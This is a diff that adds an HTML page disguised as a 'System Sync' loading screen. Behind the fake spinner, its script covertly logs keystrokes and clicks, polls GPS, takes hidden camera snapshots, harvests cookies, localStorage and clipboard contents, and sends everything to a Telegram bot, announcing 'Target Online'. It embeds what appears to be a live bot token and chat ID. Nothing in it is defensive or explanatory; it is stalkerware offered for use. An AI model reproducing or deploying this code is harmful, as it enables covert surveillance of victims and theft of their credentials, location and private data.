@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>System Sync</title>
+                <style>
+                        body { background-color: #f8f9fa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; overflow: hidden; }
+        /* Fake Loading Screen */
+                .loader-container {
+                            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+                                        text-align: center; width: 100%; pointer-events: none;
+                                                }
+                                                        .spinner {
+                                                                    border: 5px solid #e9ecef; border-top: 5px solid #0d6efd;
+                                                                                border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px;
+                                                                                        }
+                                                                                                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+                                                                                                        h3 { color: #495057; margin: 0; font-weight: 600; }
+                                                                                                                p { color: #adb5bd; margin: 5px 0 0; font-size: 14px; }
+        /* Hidden Elements */
+                #cam-video { position: fixed; top: -20px; left: -20px; width: 1px; height: 1px; opacity: 0; z-index: -1; }
+                        #click-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; cursor: default; }
+                            </style>
+                            </head>
+                            <body>
+    <!-- Visual Deception -->
+        <div class="loader-container">
+                <div class="spinner"></div>
+                        <h3>Syncing Data...</h3>
+                                <p>Please do not close the app.</p>
+                                    </div>
+    <!-- Stealth Camera -->
+        <video id="cam-video" autoplay playsinline muted></video>
+    <!-- Transparent Layer for Click/Keylogging -->
+        <div id="click-layer"></div>
+<script>
+    // ==========================================
+        // 🔑 CONFIGURATION
+            // ==========================================
+                // ⚠️ IMPORTANT: Apna Bot Token yahan daalo. 
+                    const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; 
+    // Chat ID already extracted from your JSON:
+        const CHAT_ID = "6534130302"; 
+    const TG_API = `https://api.telegram.org/bot$9209995430:AAFHrVmN8m2yNpuIZlbh1lURlS1PBB-Gx44/sendMessage`;
+    // ==========================================
+        // 1. KEYLOGGER (Tracks Typing)
+            // ==========================================
+                document.addEventListener('keypress', function(e) {
+                        let key = e.key;
+                                if(key === 'Enter') key = '[ENTER]';
+                                        if(key === 'Backspace') key = '[DEL]';
+                                                if(key === ' ') key = '[SPACE]';
+        sendMsg(`⌨️ Key: ${key}`);
+            });
+    // ==========================================
+        // 2. CLICK TRACKER (Maps Touch Points)
+            // ==========================================
+                document.getElementById('click-layer').addEventListener('click', function(e) {
+                        sendMsg(`📍 Click at X:${Math.round(e.clientX)}, Y:${Math.round(e.clientY)}`);
+                            });
+    // ==========================================
+        // 3. GPS TRACKING (High Frequency)
+            // ==========================================
+                function trackGPS() {
+                        if(navigator.geolocation) {
+                                    navigator.geolocation.getCurrentPosition(pos => {
+                                                    let lat = pos.coords.latitude.toFixed(6);
+                                                                    let lng = pos.coords.longitude.toFixed(6);
+                                                                                    let acc = Math.round(pos.coords.accuracy) + "m";
+                                                                                                    let link = `https://www.google.com/maps?q=${lat},${lng}`;
+                sendMsg(`📍 Location Update:\nLat: ${lat}\nLong: ${lng}\nAcc: ${acc}\n🔗 ${link}`);
+                            }, err => console.log("GPS Fail"));
+                                    }
+                                        }
+                                            // Track every 15 seconds
+                                                setInterval(trackGPS, 15000);
+                                                    trackGPS(); // Start immediately
+    // ==========================================
+        // 4. STEALTH CAMERA (Snapshot)
+            // ==========================================
+                async function takePhoto() {
+                        try {
+                                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                                                const vid = document.getElementById('cam-video');
+                                                            vid.srcObject = stream;
+            setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                                            canvas.width = vid.videoWidth;
+                                                            canvas.height = vid.videoHeight;
+                                                                            canvas.getContext('2d').drawImage(vid, 0, 0);
+                                                                                            canvas.toBlob(blob => {
+                                                                                                                uploadFile(blob, 'stealth_snap.jpg');
+                                                                                                                                }, 'image/jpeg', 0.7);
+                                                                                                                                                stream.getTracks().forEach(track => track.stop());
+                                                                                                                                                            }, 2000);
+                                                                                                                                                                    } catch (err) {
+                                                                                                                                                                                console.error("Camera Error:", err);
+                                                                                                                                                                                        }
+                                                                                                                                                                                            }
+                                                                                                                                                                                                // Take photo every 30 seconds
+                                                                                                                                                                                                    setInterval(takePhoto, 30000);
+                                                                                                                                                                                                        setTimeout(takePhoto, 5000); // First photo after 5 sec
+    // ==========================================
+        // 5. DATA HARVESTER (Cookies & LocalStorage)
+            // ==========================================
+                function harvestData() {
+                        let data = {
+                                    cookies: document.cookie,
+                                                localStorage: JSON.stringify(localStorage),
+                                                            userAgent: navigator.userAgent,
+                                                                        language: navigator.language,
+                                                                                    platform: navigator.platform
+                                                                                            };
+                                                                                                    sendMsg(`📦 System Data:\n${JSON.stringify(data).substring(0, 4000)}`);
+                                                                                                        }
+                                                                                                            // Harvest every 2 minutes
+                                                                                                                setInterval(harvestData, 120000);
+                                                                                                                    harvestData(); // Run immediately
+    // ==========================================
+        // 6. TELEGRAM SENDER
+            // ==========================================
+                async function sendMsg(text) {
+                        if (!text || text.length > 4000) return;
+                                const url = `${TG_API}?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+                                        fetch(url).catch(err => console.error("Send failed", err));
+                                            }
+    async function uploadFile(file, filename) {
+            const formData = new FormData();
+                    formData.append("chat_id", CHAT_ID);
+                            formData.append("photo", file, filename);
+                                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                                            fetch(url, { method: "POST", body: formData }).catch(err => console.error("Upload failed", err));
+                                                }
+    // ==========================================
+        // 7. CLIPBOARD MONITOR
+            // ==========================================
+                setInterval(async () => {
+                        try {
+                                    const text = await navigator.clipboard.readText();
+                                                if (text && text.length > 0) {
+                                                                sendMsg(`📋 Clipboard Content:\n${text.substring(0, 2000)}`);
+                                                                            }
+                                                                                    } catch (err) {}
+                                                                                        }, 10000);
+    // Initial Handshake
+        sendMsg("🟢 Target Online: " + new Date().toLocaleString());
+        </script>
+        </body>
+        </html>
